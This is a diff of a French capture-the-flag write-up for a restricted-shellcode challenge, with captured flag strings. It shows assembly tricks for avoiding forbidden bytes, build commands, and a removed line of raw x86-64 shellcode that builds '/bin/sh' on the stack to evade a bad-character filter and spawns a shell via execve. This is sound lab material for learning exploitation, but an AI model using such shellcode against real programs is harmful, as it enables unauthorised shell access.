@@ -5,18 +5,35 @@ Mot de passe: FLAG-351p97Rd81169t7d4904K6031S
 Cette fois le payload de la question précédente a des caractères illégaux:
 "\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31" 
 
-On va tenter de le construire dynamiquement
 
+On ne pourra donc pas mettre le registre rax à 0 avec la technique xor
 
+on va avoir cette approche plutôt:
 
+```asm
+push byte 1     ; Pousse 1 sur la pile
+pop rbx         ; Récupère dans rbx (rbx = 1)
+dec bl          ; Décrémente le byte bas (1 - 1 = 0)
+```
+On ne pourra pas non plus utiliser xchg pour changer les registres, on va donc utiliser:
+
+```asm
+push rax    ; Sauvegarde rax
+push rbx    ; Sauvegarde rbx
+pop rax     ; rax prend la valeur de rbx
+pop rbx     ; rbx prend la valeur de rax
+```
+
+J'ai ensuite lancé docker:
 docker run -it --rm -v $(pwd):/work ubuntu:20.04 bash
+
+Dans le conteneur Docker
 apt-get update && apt-get install -y nasm binutils
 
+Finalement on exécute:
+./build.sh level3.asm
 
 
+Une fois le payload mis, il suffit d'écrire /home/level3/level3.flag
 
-
-This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31" max size 50 bytes.
-Flag is in /home/level3/level3.flag       
-
-\x68\x2d\x63\x69\x6e\xc7\x44\x24\x04\x2d\x73\x68\x01\xfe\x04\x24\xfe\x04\x24\xfe\x4c\x24\x01\xfe\x44\x24\x04\xfe\x44\x24\x04\xfe\x4c\x24\x07\x6a\x00\x5a\x6a\x00\x5e\x6a\x3b\x58\x0f\x05
+FLAG-GSqrWoJEFRCbfNKUMNiTs3sYiM
